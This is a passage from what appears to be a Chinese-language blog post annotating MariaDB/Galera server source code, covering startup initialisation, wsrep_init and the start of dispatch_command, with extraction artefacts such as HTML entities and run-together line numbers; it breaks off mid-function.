my_uuid_init((ulong) (my_rnd(&amp;sql_rand))*12345,12345); //初始化uuid#ifdef HAVE_REPLICATION init_slave_list();#endif wt_init(); //初始化wt_wait_table /* Setup logs */ /* Enable old-fashioned error log, except when the user has requested help information. Since the implementation of plugin server variables the help output is now written much later. */ if (opt_error_log &amp;&amp; !opt_abort) &#123; if (!log_error_file_ptr[0]) &#123; fn_format(log_error_file, pidfile_name, mysql_data_home, \".err\", MY_REPLACE_EXT); /* replace '.&lt;domain&gt;' by '.err', bug#4997 */ SYSVAR_AUTOSIZE(log_error_file_ptr, log_error_file); &#125; else &#123; fn_format(log_error_file, log_error_file_ptr, mysql_data_home, \".err\", MY_UNPACK_FILENAME | MY_SAFE_PATH); log_error_file_ptr= log_error_file; &#125; if (!log_error_file[0]) opt_error_log= 0; // Too long file name else &#123; my_bool res;#ifndef EMBEDDED_LIBRARY res= reopen_fstreams(log_error_file, stdout, stderr);#else res= reopen_fstreams(log_error_file, NULL, stderr);#endif if (!res) setbuf(stderr, NULL);#ifdef _WIN32 /* Add error log to windows crash reporting. */ add_file_to_crash_report(log_error_file);#endif &#125; &#125; /* set up the hook before initializing plugins which may use it */ error_handler_hook= my_message_sql; proc_info_hook= set_thd_stage_info;#ifdef WITH_PERFSCHEMA_STORAGE_ENGINE /* Parsing the performance schema command line option may have reported warnings/information messages. Now that the logger is finally available, and redirected to the proper file when the --log--error option is used, print the buffered messages to the log. */ buffered_logs.print(); buffered_logs.cleanup();#endif /* WITH_PERFSCHEMA_STORAGE_ENGINE */#ifndef EMBEDDED_LIBRARY /* Now that the logger is available, redirect character set errors directly to the logger (instead of the buffered_logs used at the server startup time). */ my_charset_error_reporter= charset_error_reporter;#endif xid_cache_init(); //xid缓存初始化 /* initialize delegates for extension observers, errors have already been reported in the function */ if (delegates_init()) unireg_abort(1); /* need to configure logging before initializing storage engines */ if (!opt_bin_log_used &amp;&amp; !WSREP_ON) &#123; if (opt_log_slave_updates) sql_print_warning(\"You need to use --log-bin to make \" \"--log-slave-updates work.\"); if (binlog_format_used) sql_print_warning(\"You need to use --log-bin to make \" \"--binlog-format work.\"); &#125; /* Check that we have not let the format to unspecified at this point */ DBUG_ASSERT((uint)global_system_variables.binlog_format &lt;= array_elements(binlog_format_names)-1);#ifdef HAVE_REPLICATION if (opt_log_slave_updates &amp;&amp; replicate_same_server_id) &#123; if (opt_bin_log) &#123; sql_print_error(\"using --replicate-same-server-id in conjunction with \" \"--log-slave-updates is impossible, it would lead to \" \"infinite loops in this server.\"); unireg_abort(1); &#125; else sql_print_warning(\"using --replicate-same-server-id in conjunction with \" \"--log-slave-updates would lead to infinite loops in \" \"this server. However this will be ignored as the \" \"--log-bin option is not defined.\"); &#125;#endif if (opt_bin_log) //binlog日志打开？ &#123; /* Reports an error and aborts, if the --log-bin's path is a directory.*/ if (opt_bin_logname[0] &amp;&amp; opt_bin_logname[strlen(opt_bin_logname) - 1] == FN_LIBCHAR) &#123; sql_print_error(\"Path '%s' is a directory name, please specify \" \"a file name for --log-bin option\", opt_bin_logname); unireg_abort(1); &#125; /* Reports an error and aborts, if the --log-bin-index's path is a directory.*/ if (opt_binlog_index_name &amp;&amp; opt_binlog_index_name[strlen(opt_binlog_index_name) - 1] == FN_LIBCHAR) &#123; sql_print_error(\"Path '%s' is a directory name, please specify \" \"a file name for --log-bin-index option\", opt_binlog_index_name); unireg_abort(1); &#125; char buf[FN_REFLEN]; const char *ln; ln= mysql_bin_log.generate_name(opt_bin_logname, \"-bin\", 1, buf); if (!opt_bin_logname[0] &amp;&amp; !opt_binlog_index_name) &#123; /* User didn't give us info to name the binlog index file. Picking `hostname`-bin.index like did in 4.x, causes replication to fail if the hostname is changed later. So, we would like to instead require a name. But as we don't want to break many existing setups, we only give warning, not error. */ sql_print_warning(\"No argument was provided to --log-bin and \" \"neither --log-basename or --log-bin-index where \" \"used; This may cause repliction to break when this \" \"server acts as a master and has its hostname \" \"changed! Please use '--log-basename=%s' or \" \"'--log-bin=%s' to avoid this problem.\", opt_log_basename, ln); &#125; if (ln == buf) opt_bin_logname= my_once_strdup(buf, MYF(MY_WME)); &#125; /* Wsrep initialization must happen at this point, because: - opt_bin_logname must be known when starting replication since SST may need it - SST may modify binlog index file, so it must be opened after SST has happened We also (unconditionally) initialize wsrep LOCKs and CONDs. It is because they are used while accessing wsrep system variables even when a wsrep provider is not loaded. */ wsrep_thr_init(); if (WSREP_ON &amp;&amp; !wsrep_recovery &amp;&amp; !opt_abort) /* WSREP BEFORE SE */ &#123; if (opt_bootstrap) // bootsrap option given - disable wsrep functionality &#123; wsrep_provider_init(WSREP_NONE); //节点初始化 if (wsrep_init()) //初始化数据结构和回调函数 unireg_abort(1); &#125; else // full wsrep initialization &#123; // add basedir/bin to PATH to resolve wsrep script names char* const tmp_path= (char*)my_alloca(strlen(mysql_home) + strlen(\"/bin\") + 1); if (tmp_path) &#123; strcpy(tmp_path, mysql_home); strcat(tmp_path, \"/bin\"); wsrep_prepend_PATH(tmp_path); &#125; else &#123; WSREP_ERROR(\"Could not append %s/bin to PATH\", mysql_home); &#125; my_afree(tmp_path); if (wsrep_before_SE()) &#123; set_ports(); // this is also called in network_init() later but we need // to know mysqld_port now - lp:1071882 wsrep_init_startup(true); &#125; &#125; &#125; if (opt_bin_log) //如果binlog打开，打开索引文件 &#123; if (mysql_bin_log.open_index_file(opt_binlog_index_name, opt_bin_logname, TRUE)) &#123; unireg_abort(1); &#125; &#125; if (opt_bin_log) &#123; log_bin_basename= rpl_make_log_name(opt_bin_logname, pidfile_name, opt_bin_logname ? \"\" : \"-bin\"); log_bin_index= rpl_make_log_name(opt_binlog_index_name, log_bin_basename, \".index\"); if (log_bin_basename == NULL || log_bin_index == NULL) &#123; sql_print_error(\"Unable to create replication path names:\" \" out of memory or path names too long\" \" (path name exceeds \" STRINGIFY_ARG(FN_REFLEN) \" or file name exceeds \" STRINGIFY_ARG(FN_LEN) \").\"); unireg_abort(1); &#125; &#125;#ifndef EMBEDDED_LIBRARY DBUG_PRINT(\"debug\", (\"opt_bin_logname: %s, opt_relay_logname: %s, pidfile_name: %s\", opt_bin_logname, opt_relay_logname, pidfile_name)); if (opt_relay_logname) &#123; relay_log_basename= rpl_make_log_name(opt_relay_logname, pidfile_name, opt_relay_logname ? \"\" : \"-relay-bin\"); relay_log_index= rpl_make_log_name(opt_relaylog_index_name, relay_log_basename, \".index\"); if (relay_log_basename == NULL || relay_log_index == NULL) &#123; sql_print_error(\"Unable to create replication path names:\" \" out of memory or path names too long\" \" (path name exceeds \" STRINGIFY_ARG(FN_REFLEN) \" or file name exceeds \" STRINGIFY_ARG(FN_LEN) \").\"); unireg_abort(1); &#125; &#125;#endif /* !EMBEDDED_LIBRARY */ /* call ha_init_key_cache() on all key caches to init them */ process_key_caches(&amp;ha_init_key_cache, 0); init_global_table_stats(); //初始化全局表统计 init_global_index_stats(); /* Allow storage engine to give real error messages */ if (ha_init_errors()) DBUG_RETURN(1); tc_log= 0; // ha_initialize_handlerton() needs that if (plugin_init(&amp;remaining_argc, remaining_argv, (opt_noacl ? PLUGIN_INIT_SKIP_PLUGIN_TABLE : 0) | (opt_abort ? PLUGIN_INIT_SKIP_INITIALIZATION : 0))) &#123; sql_print_error(\"Failed to initialize plugins.\"); unireg_abort(1); &#125; plugins_are_initialized= TRUE; /* Don't separate from init function */ /* we do want to exit if there are any other unknown options */ if (remaining_argc &gt; 1) &#123; int ho_error; struct my_option no_opts[]= &#123; &#123;0, 0, 0, 0, 0, 0, GET_NO_ARG, NO_ARG, 0, 0, 0, 0, 0, 0&#125; &#125;; /* We need to eat any 'loose' arguments first before we conclude that there are unprocessed options. */ my_getopt_skip_unknown= 0; if ((ho_error= handle_options(&amp;remaining_argc, &amp;remaining_argv, no_opts, mysqld_get_one_option))) unireg_abort(ho_error); /* Add back the program name handle_options removes */ remaining_argc++; remaining_argv--; my_getopt_skip_unknown= TRUE; if (remaining_argc &gt; 1) &#123; fprintf(stderr, \"%s: Too many arguments (first extra is '%s').\\n\", my_progname, remaining_argv[1]); unireg_abort(1); &#125; &#125; if (init_io_cache_encryption()) unireg_abort(1); if (opt_abort) unireg_abort(0); /* if the errmsg.sys is not loaded, terminate to maintain behaviour */ if (!DEFAULT_ERRMSGS[0][0]) unireg_abort(1); /* We have to initialize the storage engines before CSV logging */ if (ha_init()) &#123; sql_print_error(\"Can't init databases\"); unireg_abort(1); &#125; if (opt_bootstrap) log_output_options= LOG_FILE; else logger.init_log_tables(); if (log_output_options &amp; LOG_NONE) &#123; /* Issue a warining if there were specified additional options to the log-output along with NONE. Probably this wasn't what user wanted. */ if ((log_output_options &amp; LOG_NONE) &amp;&amp; (log_output_options &amp; ~LOG_NONE)) sql_print_warning(\"There were other values specified to \" \"log-output besides NONE. Disabling slow \" \"and general logs anyway.\"); logger.set_handlers(LOG_FILE, LOG_NONE, LOG_NONE); &#125; else &#123; /* fall back to the log files if tables are not present */ LEX_STRING csv_name=&#123;C_STRING_WITH_LEN(\"csv\")&#125;; if (!plugin_is_ready(&amp;csv_name, MYSQL_STORAGE_ENGINE_PLUGIN)) &#123; /* purecov: begin inspected */ sql_print_error(\"CSV engine is not present, falling back to the \" \"log files\"); SYSVAR_AUTOSIZE(log_output_options, (log_output_options &amp; ~LOG_TABLE) | LOG_FILE); /* purecov: end */ &#125; logger.set_handlers(LOG_FILE, global_system_variables.sql_log_slow ? log_output_options:LOG_NONE, opt_log ? log_output_options:LOG_NONE); &#125; if (init_default_storage_engine(default_storage_engine, table_plugin)) unireg_abort(1); if (default_tmp_storage_engine &amp;&amp; !*default_tmp_storage_engine) default_tmp_storage_engine= NULL; if (enforced_storage_engine &amp;&amp; !*enforced_storage_engine) enforced_storage_engine= NULL; if (init_default_storage_engine(default_tmp_storage_engine, tmp_table_plugin)) unireg_abort(1); if (init_default_storage_engine(enforced_storage_engine, enforced_table_plugin)) unireg_abort(1);#ifdef USE_ARIA_FOR_TMP_TABLES if (!ha_storage_engine_is_enabled(maria_hton) &amp;&amp; !opt_bootstrap) &#123; sql_print_error(\"Aria engine is not enabled or did not start. The Aria engine must be enabled to continue as mysqld was configured with --with-aria-tmp-tables\"); unireg_abort(1); &#125;#endif#ifdef WITH_WSREP if (WSREP_ON &amp;&amp; !opt_bin_log) &#123; wsrep_emulate_bin_log= 1; &#125;#endif tc_log= get_tc_log_implementation(); if (tc_log-&gt;open(opt_bin_log ? opt_bin_logname : opt_tc_log_file)) &#123; sql_print_error(\"Can't init tc log\"); unireg_abort(1); &#125; if (ha_recover(0)) &#123; unireg_abort(1); &#125; if (opt_bin_log) &#123; /** * mutex lock is not needed here. * but to be able to have mysql_mutex_assert_owner() in code, * we do it anyway */ mysql_mutex_lock(mysql_bin_log.get_log_lock()); int r= mysql_bin_log.open(opt_bin_logname, LOG_BIN, 0, 0, WRITE_CACHE, max_binlog_size, 0, TRUE); mysql_mutex_unlock(mysql_bin_log.get_log_lock()); if (r) unireg_abort(1); &#125;#ifdef HAVE_REPLICATION if (opt_bin_log &amp;&amp; expire_logs_days) &#123; time_t purge_time= server_start_time - expire_logs_days*24*60*60; if (purge_time &gt;= 0) mysql_bin_log.purge_logs_before_date(purge_time); &#125;#endif if (opt_myisam_log) (void) mi_log(1);#if defined(HAVE_MLOCKALL) &amp;&amp; defined(MCL_CURRENT) &amp;&amp; !defined(EMBEDDED_LIBRARY) if (locked_in_memory) &#123; int error; if (user_info) &#123; DBUG_ASSERT(!getuid()); if (setreuid((uid_t) -1, 0) == -1) &#123; sql_perror(\"setreuid\"); unireg_abort(1); &#125; error= mlockall(MCL_CURRENT); set_user(mysqld_user, user_info); &#125; else error= mlockall(MCL_CURRENT); if (error) &#123; if (global_system_variables.log_warnings) sql_print_warning(\"Failed to lock memory. Errno: %d\\n\",errno); locked_in_memory= 0; &#125; &#125;#else locked_in_memory= 0;#endif ft_init_stopwords(); init_max_user_conn(); //初始化最大用户链接数目 init_update_queries(); // 初始化update queries init_global_user_stats(); init_global_client_stats(); if (!opt_bootstrap) servers_init(0); init_status_vars(); DBUG_RETURN(0);&#125; wsrep_init初始化： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197int wsrep_init()&#123; int rcode= -1; DBUG_ASSERT(wsrep_inited == 0); if (strcmp(wsrep_start_position, WSREP_START_POSITION_ZERO)) wsrep_start_position_init(wsrep_start_position); //初始化启动位置，扫描uuid和seqno wsrep_sst_auth_init(wsrep_sst_auth); // 同步数据认证 wsrep_causal_reads_update(&amp;global_system_variables); // wsrep_sync_wait状态更新 wsrep_ready_set(FALSE); assert(wsrep_provider); wsrep_init_position(); //根据获取到的uuid和seqno启动位置 if ((rcode= wsrep_load(wsrep_provider, &amp;wsrep, wsrep_log_cb)) != WSREP_OK) //wsrep_provider加载 &#123; if (strcasecmp(wsrep_provider, WSREP_NONE)) &#123; WSREP_ERROR(\"wsrep_load(%s) failed: %s (%d). Reverting to no provider.\", wsrep_provider, strerror(rcode), rcode); strcpy((char*)wsrep_provider, WSREP_NONE); // damn it's a dirty hack (void) wsrep_init(); return rcode; &#125; else /* this is for recursive call above */ &#123; WSREP_ERROR(\"Could not revert to no provider: %s (%d). Need to abort.\", strerror(rcode), rcode); unireg_abort(1); &#125; &#125; if (!WSREP_PROVIDER_EXISTS) //如果不存在初始化 &#123; // enable normal operation in case no provider is specified wsrep_ready_set(TRUE); wsrep_inited= 1; global_system_variables.wsrep_on = 0; wsrep_init_args args; args.logger_cb = wsrep_log_cb; args.options = (wsrep_provider_options) ? wsrep_provider_options : \"\"; rcode = wsrep-&gt;init(wsrep, &amp;args); if (rcode) &#123; DBUG_PRINT(\"wsrep\",(\"wsrep::init() failed: %d\", rcode)); WSREP_ERROR(\"wsrep::init() failed: %d, must shutdown\", rcode); wsrep-&gt;free(wsrep); free(wsrep); wsrep = NULL; &#125; return rcode; &#125; else &#123; global_system_variables.wsrep_on = 1; strncpy(provider_name, wsrep-&gt;provider_name, sizeof(provider_name) - 1); strncpy(provider_version, wsrep-&gt;provider_version, sizeof(provider_version) - 1); strncpy(provider_vendor, wsrep-&gt;provider_vendor, sizeof(provider_vendor) - 1); &#125; /* Initialize node address */ char node_addr[512]= &#123; 0, &#125;; size_t const node_addr_max= sizeof(node_addr) - 1; if (!wsrep_node_address || !strcmp(wsrep_node_address, \"\")) &#123; size_t const ret= wsrep_guess_ip(node_addr, node_addr_max); if (!(ret &gt; 0 &amp;&amp; ret &lt; node_addr_max)) &#123; WSREP_WARN(\"Failed to guess base node address. Set it explicitly via \" \"wsrep_node_address.\"); node_addr[0]= '\\0'; &#125; &#125; else &#123; strncpy(node_addr, wsrep_node_address, node_addr_max); &#125; /* Initialize node's incoming address */ char inc_addr[512]= &#123; 0, &#125;; size_t const inc_addr_max= sizeof (inc_addr); /* In case wsrep_node_incoming_address is either not set or set to AUTO, we need to use mysqld's my_bind_addr_str:mysqld_port, lastly fallback to wsrep_node_address' value if mysqld's bind-address is not set either. */ if ((!wsrep_node_incoming_address || !strcmp (wsrep_node_incoming_address, WSREP_NODE_INCOMING_AUTO))) &#123; bool is_ipv6= false; unsigned int my_bind_ip= INADDR_ANY; // default if not set if (my_bind_addr_str &amp;&amp; strlen(my_bind_addr_str)) &#123; my_bind_ip= wsrep_check_ip(my_bind_addr_str, &amp;is_ipv6); &#125; if (INADDR_ANY != my_bind_ip) &#123; /* If its a not a valid address, leave inc_addr as empty string. mysqld is not listening for client connections on network interfaces. */ if (INADDR_NONE != my_bind_ip &amp;&amp; INADDR_LOOPBACK != my_bind_ip) &#123; const char *fmt= (is_ipv6) ? \"[%s]:%u\" : \"%s:%u\"; snprintf(inc_addr, inc_addr_max, fmt, my_bind_addr_str, mysqld_port); &#125; &#125; else /* mysqld binds to 0.0.0.0, try taking IP from wsrep_node_address. */ &#123; size_t const node_addr_len= strlen(node_addr); if (node_addr_len &gt; 0) &#123; wsp::Address addr(node_addr); if (!addr.is_valid()) &#123; WSREP_DEBUG(\"Could not parse node address : %s\", node_addr); WSREP_WARN(\"Guessing address for incoming client connections failed. \" \"Try setting wsrep_node_incoming_address explicitly.\"); goto done; &#125; const char *fmt= (addr.is_ipv6()) ? \"[%s]:%u\" : \"%s:%u\"; snprintf(inc_addr, inc_addr_max, fmt, addr.get_address(), (int) mysqld_port); &#125; &#125; &#125; else &#123; wsp::Address addr(wsrep_node_incoming_address); if (!addr.is_valid()) &#123; WSREP_WARN(\"Could not parse wsrep_node_incoming_address : %s\", wsrep_node_incoming_address); goto done; &#125; /* In case port is not specified in wsrep_node_incoming_address, we use mysqld_port. */ int port= (addr.get_port() &gt; 0) ? addr.get_port() : (int) mysqld_port; const char *fmt= (addr.is_ipv6()) ? \"[%s]:%u\" : \"%s:%u\"; snprintf(inc_addr, inc_addr_max, fmt, addr.get_address(), port); &#125;done: struct wsrep_init_args wsrep_args; //初始化启动参数数据结构 struct wsrep_gtid const state_id = &#123; local_uuid, local_seqno &#125;; wsrep_args.data_dir = wsrep_data_home_dir; wsrep_args.node_name = (wsrep_node_name) ? wsrep_node_name : \"\"; wsrep_args.node_address = node_addr; wsrep_args.node_incoming = inc_addr; wsrep_args.options = (wsrep_provider_options) ? wsrep_provider_options : \"\"; wsrep_args.proto_ver = wsrep_max_protocol_version; wsrep_args.state_id = &amp;state_id; wsrep_args.logger_cb = wsrep_log_cb; wsrep_args.view_handler_cb = wsrep_view_handler_cb; wsrep_args.apply_cb = wsrep_apply_cb; wsrep_args.commit_cb = wsrep_commit_cb; wsrep_args.unordered_cb = wsrep_unordered_cb; wsrep_args.sst_donate_cb = wsrep_sst_donate_cb; wsrep_args.synced_cb = wsrep_synced_cb; rcode = wsrep-&gt;init(wsrep, &amp;wsrep_args); //调用接口告诉galera这些信息 if (rcode) &#123; DBUG_PRINT(\"wsrep\",(\"wsrep::init() failed: %d\", rcode)); WSREP_ERROR(\"wsrep::init() failed: %d, must shutdown\", rcode); wsrep-&gt;free(wsrep); free(wsrep); wsrep = NULL; &#125; else &#123; wsrep_inited= 1; &#125; return rcode;&#125; 初始化的过程基本结束，主要初始化的过程在这个地方实现。 数据库执行语句的时候，在函数dispatcher_command函数中执行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753bool dispatch_command(enum enum_server_command command, THD *thd, char* packet, uint packet_length)&#123; NET *net= &amp;thd-&gt;net; bool error= 0; bool do_end_of_statement= true; DBUG_ENTER(\"dispatch_command\"); DBUG_PRINT(\"info\", (\"command: %d\", command)); inc_thread_running();#ifdef WITH_WSREP // 开启了wsrep的话继续走 if (WSREP(thd)) &#123; if (!thd-&gt;in_multi_stmt_transaction_mode()) &#123; thd-&gt;wsrep_PA_safe= true; &#125; mysql_mutex_lock(&amp;thd-&gt;LOCK_wsrep_thd); thd-&gt;wsrep_query_state= QUERY_EXEC; if (thd-&gt;wsrep_conflict_state== RETRY_AUTOCOMMIT) &#123; thd-&gt;wsrep_conflict_state= NO_CONFLICT; &#125; if (thd-&gt;wsrep_conflict_state== MUST_ABORT) &#123; wsrep_client_rollback(thd); &#125; if (thd-&gt;wsrep_conflict_state== ABORTED) &#123; my_error(ER_LOCK_DEADLOCK, MYF(0), \"wsrep aborted transaction\"); WSREP_DEBUG(\"Deadlock error for: %s\", thd-&gt;query()); mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd); thd-&gt;killed = NOT_KILLED; thd-&gt;mysys_var-&gt;abort = 0; thd-&gt;wsrep_conflict_state = NO_CONFLICT; thd-&gt;wsrep_retry_counter = 0; goto dispatch_end; &#125; mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd); &#125;#endif /* WITH_WSREP */ //wsrep结束#if defined(ENABLED_PROFILING) thd-&gt;profiling.start_new_query();#endif MYSQL_COMMAND_START(thd-&gt;thread_id, command, &amp;thd-&gt;security_ctx-&gt;priv_user[0], (char *) thd-&gt;security_ctx-&gt;host_or_ip); DBUG_EXECUTE_IF(\"crash_dispatch_command_before\", &#123; DBUG_PRINT(\"crash_dispatch_command_before\", (\"now\")); DBUG_ABORT(); &#125;); /* Performance Schema Interface instrumentation, begin */ thd-&gt;m_statement_psi= MYSQL_REFINE_STATEMENT(thd-&gt;m_statement_psi, com_statement_info[command]. m_key); thd-&gt;set_command(command); /* Commands which always take a long time are logged into the slow log only if opt_log_slow_admin_statements is set. */ thd-&gt;enable_slow_log= thd-&gt;variables.sql_log_slow; thd-&gt;query_plan_flags= QPLAN_INIT; thd-&gt;lex-&gt;sql_command= SQLCOM_END; /* to avoid confusing VIEW detectors */ thd-&gt;reset_kill_query(); DEBUG_SYNC(thd,\"dispatch_command_before_set_time\"); thd-&gt;set_time(); if (!(server_command_flags[command] &amp; CF_SKIP_QUERY_ID)) thd-&gt;set_query_id(next_query_id()); else &#123; /* ping, get statistics or similar stateless command. No reason to increase query id here. */ thd-&gt;set_query_id(get_query_id()); &#125; if (!(server_command_flags[command] &amp; CF_SKIP_QUESTIONS)) statistic_increment(thd-&gt;status_var.questions, &amp;LOCK_status); /* Copy data for user stats */ if ((thd-&gt;userstat_running= opt_userstat_running)) &#123; thd-&gt;start_cpu_time= my_getcputime(); memcpy(&amp;thd-&gt;org_status_var, &amp;thd-&gt;status_var, sizeof(thd-&gt;status_var)); thd-&gt;select_commands= thd-&gt;update_commands= thd-&gt;other_commands= 0; &#125; /** Clear the set of flags that are expected to be cleared at the beginning of each command. */ thd-&gt;server_status&amp;= ~SERVER_STATUS_CLEAR_SET; switch (command) &#123; case COM_INIT_DB: &#123; LEX_STRING tmp; status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_CHANGE_DB]); if (thd-&gt;copy_with_error(system_charset_info, &amp;tmp, thd-&gt;charset(), packet, packet_length)) break; if (!mysql_change_db(thd, &amp;tmp, FALSE)) &#123; general_log_write(thd, command, thd-&gt;db, thd-&gt;db_length); my_ok(thd); &#125; break; &#125;#ifdef HAVE_REPLICATION case COM_REGISTER_SLAVE: &#123; status_var_increment(thd-&gt;status_var.com_register_slave); if (!register_slave(thd, (uchar*)packet, packet_length)) my_ok(thd); break; &#125;#endif case COM_CHANGE_USER: &#123; int auth_rc; status_var_increment(thd-&gt;status_var.com_other); thd-&gt;change_user(); thd-&gt;clear_error(); // if errors from rollback /* acl_authenticate() takes the data from net-&gt;read_pos */ net-&gt;read_pos= (uchar*)packet; uint save_db_length= thd-&gt;db_length; char *save_db= thd-&gt;db; USER_CONN *save_user_connect= thd-&gt;user_connect; Security_context save_security_ctx= *thd-&gt;security_ctx; CHARSET_INFO *save_character_set_client= thd-&gt;variables.character_set_client; CHARSET_INFO *save_collation_connection= thd-&gt;variables.collation_connection; CHARSET_INFO *save_character_set_results= thd-&gt;variables.character_set_results; /* Ensure we don't free security_ctx-&gt;user in case we have to revert */ thd-&gt;security_ctx-&gt;user= 0; thd-&gt;user_connect= 0; /* to limit COM_CHANGE_USER ability to brute-force passwords, we only allow three unsuccessful COM_CHANGE_USER per connection. */ if (thd-&gt;failed_com_change_user &gt;= 3) &#123; my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd,ER_UNKNOWN_COM_ERROR), MYF(0)); auth_rc= 1; &#125; else auth_rc= acl_authenticate(thd, packet_length); mysql_audit_notify_connection_change_user(thd); if (auth_rc) &#123; /* Free user if allocated by acl_authenticate */ my_free(thd-&gt;security_ctx-&gt;user); *thd-&gt;security_ctx= save_security_ctx; if (thd-&gt;user_connect) decrease_user_connections(thd-&gt;user_connect); thd-&gt;user_connect= save_user_connect; thd-&gt;reset_db(save_db, save_db_length); thd-&gt;variables.character_set_client= save_character_set_client; thd-&gt;variables.collation_connection= save_collation_connection; thd-&gt;variables.character_set_results= save_character_set_results; thd-&gt;update_charset(); thd-&gt;failed_com_change_user++; my_sleep(1000000); &#125; else &#123;#ifndef NO_EMBEDDED_ACCESS_CHECKS /* we've authenticated new user */ if (save_user_connect) decrease_user_connections(save_user_connect);#endif /* NO_EMBEDDED_ACCESS_CHECKS */ my_free(save_db); my_free(save_security_ctx.user); &#125; break; &#125; case COM_STMT_EXECUTE: &#123; mysqld_stmt_execute(thd, packet, packet_length); break; &#125; case COM_STMT_FETCH: &#123; mysqld_stmt_fetch(thd, packet, packet_length); break; &#125; case COM_STMT_SEND_LONG_DATA: &#123; mysql_stmt_get_longdata(thd, packet, packet_length); break; &#125; case COM_STMT_PREPARE: &#123; mysqld_stmt_prepare(thd, packet, packet_length); break; &#125; case COM_STMT_CLOSE: &#123; mysqld_stmt_close(thd, packet); break; &#125; case COM_STMT_RESET: &#123; mysqld_stmt_reset(thd, packet); break; &#125; case COM_QUERY: //查询语句 &#123; DBUG_ASSERT(thd-&gt;m_digest == NULL); thd-&gt;m_digest= &amp; thd-&gt;m_digest_state; thd-&gt;m_digest-&gt;reset(thd-&gt;m_token_array, max_digest_length); if (alloc_query(thd, packet, packet_length)) break; // fatal error is set MYSQL_QUERY_START(thd-&gt;query(), thd-&gt;thread_id, (char *) (thd-&gt;db ? thd-&gt;db : \"\"), &amp;thd-&gt;security_ctx-&gt;priv_user[0], (char *) thd-&gt;security_ctx-&gt;host_or_ip); char *packet_end= thd-&gt;query() + thd-&gt;query_length(); general_log_write(thd, command, thd-&gt;query(), thd-&gt;query_length()); DBUG_PRINT(\"query\",(\"%-.4096s\",thd-&gt;query()));#if defined(ENABLED_PROFILING) thd-&gt;profiling.set_query_source(thd-&gt;query(), thd-&gt;query_length());#endif MYSQL_SET_STATEMENT_TEXT(thd-&gt;m_statement_psi, thd-&gt;query(), thd-&gt;query_length()); Parser_state parser_state; if (parser_state.init(thd, thd-&gt;query(), thd-&gt;query_length())) break; if (WSREP_ON) wsrep_mysql_parse(thd, thd-&gt;query(), thd-&gt;query_length(), &amp;parser_state); //wsrep_mysql_parse执行 else mysql_parse(thd, thd-&gt;query(), thd-&gt;query_length(), &amp;parser_state); //否则使用mysql_parse执行 while (!thd-&gt;killed &amp;&amp; (parser_state.m_lip.found_semicolon != NULL) &amp;&amp; ! thd-&gt;is_error()) &#123; /* Multiple queries exist, execute them individually */ char *beginning_of_next_stmt= (char*) parser_state.m_lip.found_semicolon;#ifdef WITH_ARIA_STORAGE_ENGINE ha_maria::implicit_commit(thd, FALSE);#endif /* Finalize server status flags after executing a statement. */ thd-&gt;update_server_status(); thd-&gt;protocol-&gt;end_statement(); query_cache_end_of_result(thd); mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS, thd-&gt;get_stmt_da()-&gt;is_error() ? thd-&gt;get_stmt_da()-&gt;sql_errno() : 0, command_name[command].str); ulong length= (ulong)(packet_end - beginning_of_next_stmt); log_slow_statement(thd); DBUG_ASSERT(!thd-&gt;apc_target.is_enabled()); /* Remove garbage at start of query */ while (length &gt; 0 &amp;&amp; my_isspace(thd-&gt;charset(), *beginning_of_next_stmt)) &#123; beginning_of_next_stmt++; length--; &#125; /* PSI end */ MYSQL_END_STATEMENT(thd-&gt;m_statement_psi, thd-&gt;get_stmt_da()); thd-&gt;m_statement_psi= NULL; thd-&gt;m_digest= NULL; /* DTRACE end */ if (MYSQL_QUERY_DONE_ENABLED()) &#123; MYSQL_QUERY_DONE(thd-&gt;is_error()); &#125;#if defined(ENABLED_PROFILING) thd-&gt;profiling.finish_current_query(); thd-&gt;profiling.start_new_query(\"continuing\"); thd-&gt;profiling.set_query_source(beginning_of_next_stmt, length);#endif /* DTRACE begin */ MYSQL_QUERY_START(beginning_of_next_stmt, thd-&gt;thread_id, (char *) (thd-&gt;db ? thd-&gt;db : \"\"), &amp;thd-&gt;security_ctx-&gt;priv_user[0], (char *) thd-&gt;security_ctx-&gt;host_or_ip); /* PSI begin */ thd-&gt;m_digest= &amp; thd-&gt;m_digest_state; thd-&gt;m_statement_psi= MYSQL_START_STATEMENT(&amp;thd-&gt;m_statement_state, com_statement_info[command].m_key, thd-&gt;db, thd-&gt;db_length, thd-&gt;charset()); THD_STAGE_INFO(thd, stage_init); MYSQL_SET_STATEMENT_TEXT(thd-&gt;m_statement_psi, beginning_of_next_stmt, length); thd-&gt;set_query_and_id(beginning_of_next_stmt, length, thd-&gt;charset(), next_query_id()); /* Count each 